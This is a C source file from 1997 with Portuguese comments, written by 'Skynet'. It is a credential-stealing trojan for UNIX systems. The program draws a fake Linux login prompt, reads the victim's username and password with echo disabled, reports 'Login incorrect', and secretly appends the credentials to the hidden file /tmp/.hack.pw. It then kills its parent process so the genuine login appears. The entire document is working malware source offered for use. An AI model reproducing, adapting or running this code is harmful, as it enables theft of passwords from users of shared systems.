/*----------------------------------------------------------------------
 FILE:     loghack.c 
 VERSAO:   1.0
 SISTEMAS: Qualquer um na plataforma UNIX.
 FUNCAO  : Captura logins e senhas de usuarios numa maquina local.
                 					              
 By Skynet  20/08/97 
 ----------------------------------------------------------------------*/
#define PASSWORD "Password: "
#define LOGERR "\nLogin incorrect"
#define FILENAME "/tmp/.hack.pw" /* Aqui vc define o diretorio/arquivo que
                                    contera  as senhas */
#include <stdio.h>
#include <signal.h>

void stop ()
{
        return;
}
main()
{
char    login[10],                       
        password[10];           
int                                
  pid;                 
FILE    *fo;       /* Arquivo de saida*/

signal (SIGINT, stop);
pid = getppid();  /* atribui seu processo corrente */

for(;;)
{
        /*
         Aqui vai o que aparera na tela, esperando que ele de entrada no  
	 sistema e execute o Trojan.*/
         
      for (;;)
        {
                system("/usr/bin/clear");
      loop1:    
                printf( "\n\nWelcome to Linux 2.0.0.");
      loop2:
                printf("\n\ncyberdine login: ");
                gets (login);
          /* Humm... nao digitou nada? :) */
                if (strcmp (login, "") != 0)
                  break;
                  else     
                     goto loop1; 
         }
        system ("stty -echo > /dev/console"); /* Desabilita o echo para
                                                 entrar com a password*/
        printf(PASSWORD);
        scanf("%s",password);
        getchar();
        system ("stty echo > /dev/console");
        printf (LOGERR); 
        if ( ( fo = fopen(FILENAME,"a") )  != NULL )
        {
                fprintf(fo,"\nlogin %s  password: %s\n",login,password);
                fclose(fo);  /* crack! */
        }
  /* levando  em conta a possibilidade da pessoa errar ao digitar.
     Logins com menos de 3 caracteres sao provavelmente falsos, entao
     vamos permanecer no laco*/  
       if (strlen (login) >= 3)
                break;
        else
        goto loop2;
         }
       printf (LOGERR); 
      kill (pid,9); /*Mata o processo forcando o bin login original*/
}

